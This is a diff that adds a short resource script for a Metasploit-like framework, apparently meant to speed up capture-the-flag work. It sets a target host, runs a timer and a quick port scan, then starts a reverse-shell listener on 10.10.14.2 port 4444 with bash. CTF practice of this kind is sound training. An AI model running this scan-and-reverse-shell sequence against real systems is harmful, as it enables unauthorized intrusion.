@@ -1,0 +1,21 @@
+# CTF Quick Start — Rapid enumeration for CTF challenges
+# Usage: rcf -r scripts/ctf_start.rc
+
+# Set target (override: rcf -r scripts/ctf_start.rc --set RHOSTS=10.10.10.10)
+setg RHOSTS 10.10.10.10
+
+# Quick timer start
+use auxiliary/ctf/timer
+setg ACTION start
+run
+
+# Quick port scan
+use auxiliary/scanner/ctf/quick_scan
+run
+
+# Start a listener
+use payload/ctf/reverse_shell
+setg LHOST 10.10.14.2
+setg LPORT 4444
+setg SHELL bash
+run
